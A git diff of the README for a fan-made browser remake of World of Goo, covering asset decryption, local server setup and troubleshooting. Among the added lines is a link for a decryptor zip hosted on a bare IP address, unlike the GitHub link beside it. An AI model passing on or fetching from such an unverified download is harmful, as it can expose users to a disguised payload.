@@ -1,38 +1,86 @@
 # World of Goo JavaScript Remake
 
-A JavaScript web remake of the classic physics puzzle game **World of Goo**.
+A JavaScript web remake of the classic physics puzzle game **World of Goo**, built to run in your browser.
+
+> **Status:** Mixed. Still working on the pipe, level finishing animations, EOL, etc.   
+
+<!-- Add a screenshot or short GIF here, e.g. ![Gameplay screenshot](screenshot.png) -->
 
 ## Notice
 
-To run this remake, you must own a legal copy of *World of Goo*. You will also need:
-* Your official game installation files (specifically the `res` and `properties` folders/files).
-* An external AES `.bin` file decryptor and a `.binltl` decryptor to extract the game's assets. For `.binltl` files, I reccomend using xowy64's [World of Goo Animation Tool](https://github.com/xowy64/worldofgoo-animtool/releases/tag/v1.0).
+This is an unofficial fan project. It is not affiliated with or endorsed by 2D Boy or Tomorrow Corporation.
+
+**This repository contains no game assets.** To run the remake you must own a legal copy of *World of Goo* and supply your own files. You will need:
+
+* Your official game installation files, specifically the `res` and `properties` folders. These should come from [the PC version / specify version, e.g. v1.3].
+* An AES `.bin` file decryptor: [Gootool](http://147.182.181.5:8000/downloads/9d92b7ea-5755-4203-8134-8cc7505b05d8_Gootool.zip).
+* A `.binltl` decryptor. I recommend xowy64's [World of Goo Animation Tool](https://github.com/xowy64/worldofgoo-animtool/releases/tag/v1.0).
 
 ---
 
 ## How to Set Up and Run
 
-1. **Decrypt the Game Files:** 
-   Locate your official *World of Goo* installation files, and copy the files into another folder so your original files stay intact. Then, use your decryption tools to decrypt all `.bin` and `.binltl` files. *It really doesn't matter what program you use to decrypt the files, just make sure they are all decrypted.*
+### 1. Decrypt the game files
 
-2. **Create a Project Folder:** 
-   Create a new local folder on your computer and move all of your newly decrypted game files and assets inside it. Make sure you only import the res and properties folders.
+Copy the `res` and `properties` folders from your installation into a new working folder so your originals stay intact. Then use your decryption tools to decrypt **every** `.bin` and `.binltl` file. It doesn't matter which program you use, as long as all of them end up decrypted.
 
-3. **Add the Repository Files:** 
-   Download or copy all the files from this repository and place them directly into the folder containing your decrypted game assets. If it asks you to replace anything, let it replace the files.
+### 2. Get the remake files
 
-4. **Run a Local Server:** 
-   You **cannot** run this game by simply double-clicking the `index.html` file. You must host it via a local web server. 
+Clone or download this repository:
 
-   For example, using Python, open your terminal inside that directory and run:
-   * **Python 3:**
-     ```bash
-     python -m http.server 8000
-     ```
-   * **Python 2:**
-     ```bash
-     python -m SimpleHTTPServer 8000
-     ```
+```bash
+git clone [repository URL]
+```
 
-5. **Play:** 
-   Open your web browser and navigate to `http://localhost:8000` to start playing.
+### 3. Combine everything into one folder
+
+Copy the repository's files into the folder that holds your decrypted `res` and `properties` folders. If your system asks about overwriting files, choose to **merge** the folders and replace any files with matching names. The repository's versions are the ones the remake expects.
+
+When you're done, the folder should look like this:
+
+```
+your-folder/
+├── index.html
+├── js/
+├── res/
+└── properties/
+```
+
+### 4. Start a local web server
+
+You **cannot** run the game by double-clicking `index.html`, because browsers block the file loading it needs. Serve the folder instead. Open a terminal inside it and run:
+
+```bash
+python3 -m http.server 8000
+```
+
+On Windows, the command may be `python -m http.server 8000` instead.
+
+### 5. Play
+
+Open your browser and go to `http://localhost:8000`.
+
+---
+
+## Troubleshooting
+
+* **Error: HTTP 404 for *file***. Check that `res` and `properties` sit next to `index.html` and that none of the `.bin` or `.binltl` files are still encrypted.
+* **Error: Failed to fetch** You need to use the local server from step 4.
+* **Nothing happens when you run the server command:** Make sure Python 3 is installed, and that you ran the command from inside your project folder.
+
+## Browser support
+
+Tested in: Latest version of Microsoft Edge.
+
+## Contributing and bug reports
+
+Found a bug or want to help? [Open an issue / submit a pull request] on this repository. When reporting a problem, include your browser, the game version your files came from, and any errors from the browser console.
+
+## Credits
+
+* [World of Goo](https://worldofgoo.com/) by 2D Boy, the original game.
+* [xowy64](https://github.com/xowy64) for the World of Goo Animation Tool.
+
+## License
+
+[Add your license here, e.g. MIT for the code in this repository. Note that this license does not cover any *World of Goo* assets.]
